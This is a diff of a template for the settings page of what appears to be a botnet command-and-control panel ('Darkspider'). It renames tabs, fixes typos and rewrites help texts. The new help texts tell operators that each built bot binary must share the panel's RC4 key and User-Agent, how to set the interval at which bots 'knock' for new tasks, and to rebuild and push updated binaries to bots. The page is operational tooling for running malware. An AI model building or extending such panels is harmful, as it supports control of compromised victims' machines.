@@ -20,7 +20,7 @@
                         <input type="text" class="form-control" name="createuser_username"  id="createuser_password" placeholder="Username" required>
                     </div>
                     <div class="form-group">
-                        <label for="createuser_password">Passowrd</label>
+                        <label for="createuser_password">Password</label>
                         <input type="password" class="form-control" name="createuser_password"  id="createuser_password"  placeholder="Password" required>
                     </div>
                 </div>
@@ -54,11 +54,9 @@
                 <a class="nav-link" href="#functions" role="tab" data-toggle="tab">Functions</a>
             </li>
 
+
             <li class="nav-item">
-                <a class="nav-link" href="#template" role="tab" data-toggle="tab">Template</a>
-            </li>
-            <li class="nav-item">
-                <a class="nav-link" href="#plugins" role="tab" data-toggle="tab">Plugins</a>
+                <a class="nav-link" href="#plugins" role="tab" data-toggle="tab">Modules</a>
             </li>
 
             {foreach from=$pluginSetting_Tabs item=addTab}
@@ -79,7 +77,7 @@
                     <thead>
                     <tr>
                         <th>Username</th>
-                        <th>Edit
+                        <th>
                             <button type="button" class="btn btn-primary createnewUser" data-toggle="modal" data-target="#createnewUser">
                                 Create new User
                             </button>
@@ -114,25 +112,25 @@
             <div role="tabpanel" class="tab-pane fade" id="globalsettings">
                 <form method="POST">
                     <div class="form-group">
-                        <label for="updateinfo">Update Information URL</label>
-                        <input type="text" class="form-control" name="updateinfo" value="{$config.check_update_url}" id="updateinfo" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
-                        <small id="updateinfoHelper" class="form-text text-muted">Check New versions from Darkspider.</small>
+                        <label for="updateinfo">Panel Update polling URL</label>
+                        <input type="text" class="form-control" name="updateinfo" value="{$config.check_update_url}" id="updateinfo" aria-describedby="emailHelp" placeholder="looks like: https://pastebin.com/raw/YBGEBviB">
+                        <small id="updateinfoHelper" class="form-text text-muted">The URL, which the panel will use to check for panel-updates. check darktools.me for the current polling URL.</small>
                     </div>
                       <div class="form-group">
-                            <label for="enryptionkey">Enryption Key</label>
-                            <input type="text" class="form-control" name="enryptionkey" value="{$config.enryptionkey}" id="enryptionkey" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
-                            <small id="enryptionkeyHelper" class="form-text text-muted">We'll never share your encryption key with anyone else. (This is the RC4 Cipher Private Key)</small>
+                            <label for="enryptionkey">Encryption Key</label>
+                            <input type="text" class="form-control" name="enryptionkey" value="{$config.enryptionkey}" id="enryptionkey" aria-describedby="emailHelp" placeholder="example: gh1IOtF2L1IffjOtsIDiQnQJrkLk8WJ5">
+                            <small id="enryptionkeyHelper" class="form-text text-muted">Must be used with every built BIN. If you change the key, old builds/bots are unable to connect.</small>
                         </div>
                        <div class="form-group">
                             <label for="useragent">User Agent</label>
-                            <input type="text" class="form-control" name="useragent" value="{$config.useragent}" id="useragent" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
-                            <small id="useragentHelper" class="form-text text-muted">The Bot and the Gate need the same HTTP User Agent.</small>
+                            <input type="text" class="form-control" name="useragent" value="{$config.useragent}" id="useragent" aria-describedby="emailHelp" placeholder="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0">
+                            <small id="useragentHelper" class="form-text text-muted">The Bots will use this User Agent to knock on the panel. Must be used with every built BIN. If you change the string, old builds/bots are unable to connect.</small>
                         </div>
 
                         <div class="form-group">
-                            <label for="useragent">Request Time of Bots</label>
-                            <input type="number" class="form-control" name="requestinterval" value="{$config.requestinterval}" id="requestinterval" aria-describedby="requestintervalHelp" placeholder="Enter your encryption key (From bot config.h)">
-                            <small id="requestintervalHelper" class="form-text text-muted">Its needed for a correct Online Calculation.</small>
+                            <label for="useragent">Knock interval value</label>
+                            <input type="number" class="form-control" name="requestinterval" value="{$config.requestinterval}" id="requestinterval" aria-describedby="requestintervalHelp" placeholder="example: 600">
+                            <small id="requestintervalHelper" class="form-text text-muted">The number of seconds, the Bots will wait before they knock on the panel again, to report that they are online or ask for new tasks. If your Server faces high load utilization, you want to set a higher value. Don’t forget to build a new BIN, using the same, new value. You want to update your Bots to the new BIN.</small>
                         </div>
 
                     <input type="submit" class="btn btn-primary" value="Save">
@@ -145,37 +143,8 @@
                 </div>
             </div>
 
-            <div role="tabpanel" class="tab-pane fade" id="template">
-                <form method="post">
-                    <div class="form-group">
-                        <label> Change your current Template</label> <br>
-                        <select onchange="this.form.submit()" class="form-control" name="changeTemplate">
-                            {foreach from=$templates item=template}
-                                {if $config.currentTheme == $template}
-                                    <option value="{$template}" selected>{$template}</option>
-                                {else}
-                                    <option value="{$template}">{$template}</option>
-                                {/if}
-                            {/foreach}
-                        </select>
-                    </div>
 
-                    <div class="form-group">
-                        <label> Force Compile Template</label> <br>
-                        <select onchange="this.form.submit()" class="form-control" name="forcecompile_template">
-                                {if $config.forcecompile_template == "0"}
-                                    <option value="0" selected>Disabled</option>
-                                    <option value="1">Enabled</option>
-                                {else}
-                                    <option value="0">Disabled</option>
-                                    <option value="1" selected>Enabled</option>
-                                {/if}
-                        </select>
-                    </div>
-                    <input type="submit"  class="btn btn-light" name="clearcache" value="Clear Template Cache">
-                </form>
 
-            </div>
             <div role="tabpanel" class="tab-pane fade" id="functions">
                 <form method="POST">
                     {if $encryptedOUT != ""}
@@ -207,18 +176,19 @@
                                             <input data-id="{$plugin.name}" type="checkbox" checked>
                                             <span class="slider round"></span>
                                         </label>
-
                                     {else}
                                         <label class="switch">
                                             <input data-id="{$plugin.name}" type="checkbox" >
                                             <span class="slider round"></span>
                                         </label>
-
                                     {/if}
                                 </form>
                             </td>
-                            <td>{$plugin.name}</td>
-                            <td>Plugin Settings</td>
+                            <td>
+                               <h6>  {$plugin.name} {if $plugin.info} <sup><strong>{$plugin.info.version}</strong></sup> {/if}</h6>
+
+                            </td>
+                            <td> {if $plugin.info} {if $plugin.info.state}  <span class="stable"> {$plugin.info.state}  </span> {/if} {else} <span class="alpha">alpha</span> {/if}</td>
                         </tr>
                     {/foreach}
 
@@ -234,7 +204,6 @@
                     {else}
                         {$addTab.body}
                     {/if}
-
                 </div>
             {/foreach}
 
